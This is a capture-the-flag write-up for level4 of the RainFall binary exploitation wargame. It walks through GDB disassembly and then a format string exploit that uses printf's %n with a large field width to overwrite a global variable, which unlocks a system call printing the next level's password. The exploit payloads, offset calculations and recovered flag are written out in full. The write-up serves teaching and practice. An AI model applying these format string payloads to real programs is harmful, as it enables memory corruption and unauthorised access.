# level4

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

As in the previous level, `main` does nothing but a call to function `n`.

```gdb
gdb-peda$ disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218                     ; 536 bytes of stack space reclaimed
   0x08048460 <+9>:     mov    eax,ds:0x8049804              ; eax = stdin
   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax       ; push stdin to stack
   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200     ; push 512 to stack
   0x08048471 <+26>:    lea    eax,[ebp-0x208]               ; load buffer address in eax
   0x08048477 <+32>:    mov    DWORD PTR [esp],eax           ; push eax to stack
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>         ; call fgets
   0x0804847f <+40>:    lea    eax,[ebp-0x208]               ; load buffer address in eax
   0x08048485 <+46>:    mov    DWORD PTR [esp],eax           ; push eax to stack
   0x08048488 <+49>:    call   0x8048444 <p>                 ; call p
   0x0804848d <+54>:    mov    eax,ds:0x8049810              ; eax = data segment variable (that equals 0 here)
   0x08048492 <+59>:    cmp    eax,0x1025544                 ; compare eax to 0x1025544 (16930116 in decimal)
   0x08048497 <+64>:    jne    0x80484a5 <n+78>              ; jump to leave instruction if not equal
   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590     ; push address 0x8048590 to stack (contains "/bin/cat /home/user/level5/.pass")
   0x080484a0 <+73>:    call   0x8048360 <system@plt>        ; call system
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
```

Functions called : `fgets`, `system`, and `p`

```gdb
gdb-peda$ disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   ebp
   0x08048445 <+1>:     mov    ebp,esp
   0x08048447 <+3>:     sub    esp,0x18                     ; 23 bytes of stack space reclaimed
   0x0804844a <+6>:     mov    eax,DWORD PTR [ebp+0x8]      ; copy buffer address (argument from `n` function) to eax
   0x0804844d <+9>:     mov    DWORD PTR [esp],eax          ; push eax to stack
   0x08048450 <+12>:    call   0x8048340 <printf@plt>       ; call printf
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```
Function called : `printf`

Actually, the behaviour of this program is similar to the previous one. It call `fgets` to read from stdin, print the buffer thanks to `printf`, then assign the value of the address `0x8049810` to `eax` and compare it to an arbitrary value (0x1025544) to determine if the function will leave or execute a call to the `system` function before.

We dump the content of the address `0x8048590`, used as the parameter of `system`, using gdb.

```gdb
gdb-peda$ x/s 0x8048590
0x8048590: "/bin/cat /home/user/level5/.pass"
```

So, what we have to do is to write the value '0x1025544' ('16930116' in decimal) to the address `0x8049810`, using the format string vulnerability of `printf`. They are two main differences with the previous level :
- The buffer is declared and printed in two differents functions (`n` and `p`).
- The value we have to write is way larger than the buffer size.

## Exploit

We first look for the offset in the stack where we will retrieve the content of our buffer. This offset will be further on the stack than in the previous level, due to the buffer declared in `n` and the call to `printf` done in `p`.

```console
level4@RainFall:~$ perl -e 'print "AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x\n"' > /tmp/level4
level4@RainFall:~$ cat /tmp/level4 | ./level4
AAAA b7ff26b0 bffff784 b7fd0ff4 00000000 00000000 bffff748 0804848d bffff540 00000200 b7fd1ac0 b7ff37d0 41414141
```

Knowing that the 12th argument is the beginning of our buffer, we have to find a way to make `printf` write 16930116 byt1es before using the `%n` conversion. To do so, we use the field width modifier of `printf` on the last `%x` conversion, as we did previously on each one to print the stack content with an eight characters padding.

But before, we prepare our string without this padding to write its length to `eax` and get it with gdb.

```console
level4@RainFall:~$ perl -e 'print "\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n"' > /tmp/level4
level4@RainFall:~$ gdb ./level4
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
gdb-peda$ b *0x08048492
Breakpoint 1 at 0x8048492
gdb-peda$ run < /tmp/level4
Breakpoint 1, 0x08048492 in n ()
gdb-peda$ x/s $eax
0x48:	 <Address 0x48 out of bounds>
```

Our current string length is 0x48, or 72 in decimal, we want to write the value 16930116, and the `%x` argument we use for the padding contains the value 'b7ff37d0' which is 8 bytes long to print.

16930116 - 72 + 8 = 16930052 bytes of padding needed. Let's do it !

```console
level4@RainFall:~$ perl -e 'print "\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%16930052x%n"' > /tmp/level4
level4@RainFall:~$ cat /tmp/level4 | ./level4
...
[hit return, then wait for printf to write the whole string, which is very long]
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
